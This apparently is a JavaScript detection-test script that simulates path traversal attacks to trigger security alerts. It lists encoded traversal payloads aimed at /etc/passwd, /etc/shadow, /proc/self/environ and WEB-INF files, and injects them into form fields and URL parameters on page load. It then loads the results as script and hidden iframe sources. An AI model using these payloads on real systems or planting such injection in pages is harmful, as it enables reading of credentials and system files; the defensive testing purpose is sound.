// Simulated directory traversal/path traversal attack patterns
// These patterns would trigger security alerts

// Function to generate path traversal payloads
function pathTraversalPayloads() {
    var payloads = [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "../../../../../../../../etc/shadow",
        "/var/www/../../etc/passwd",
        "../../../../../../../../windows/win.ini",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/var/log/apache/access.log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access.log",
        "C:\\boot.ini",
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/database.properties"
    ];
    
    return payloads[Math.floor(Math.random() * payloads.length)];
}

// Attach to forms to inject path traversal
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            e.preventDefault();
            injectPathTraversal(this);
        });
    }
    
    // Add listener for URL with file-related parameters
    var url = new URL(window.location.href);
    var fileParams = ['file', 'path', 'doc', 'document', 'load', 'download', 'read', 'include'];
    
    for (var i = 0; i < fileParams.length; i++) {
        if (url.searchParams.has(fileParams[i])) {
            var path = url.searchParams.get(fileParams[i]);
            simulateFileAccess(path + "/" + pathTraversalPayloads());
            break;
        }
    }
});

function injectPathTraversal(form) {
    var inputs = form.getElementsByTagName('input');
    var data = {};
    
    for (var i = 0; i < inputs.length; i++) {
        var input = inputs[i];
        if (input.name) {
            if (input.name.includes('file') || input.name.includes('path') || 
                input.name.includes('doc') || input.name.includes('document') || 
                input.name.includes('load') || input.name.includes('include')) {
                
                // Add path traversal payload
                data[input.name] = input.value + "/" + pathTraversalPayloads();
            } else {
                data[input.name] = input.value;
            }
        }
    }
    
    // Simulate sending to server
    simulateFileAccess(data);
}

function simulateFileAccess(data) {
    console.log("Simulated path traversal: ", data);
    
    // This would normally send an AJAX request
    // But we're just simulating for detection purposes
    var output = document.createElement('div');
    output.className = 'file-content';
    output.innerHTML = '<pre>Simulated file access: ' + JSON.stringify(data) + '</pre>';
    document.body.appendChild(output);
    
    // Also try to include as a script - would trigger detection
    var script = document.createElement('script');
    if (typeof data === 'object') {
        for (var key in data) {
            if (data.hasOwnProperty(key)) {
                script.src = data[key];
                break;
            }
        }
    } else {
        script.src = data;
    }
    
    document.head.appendChild(script);
    
    // And as an iframe - would trigger detection
    var iframe = document.createElement('iframe');
    if (typeof data === 'object') {
        for (var key in data) {
            if (data.hasOwnProperty(key)) {
                iframe.src = data[key];
                break;
            }
        }
    } else {
        iframe.src = data;
    }
    
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
}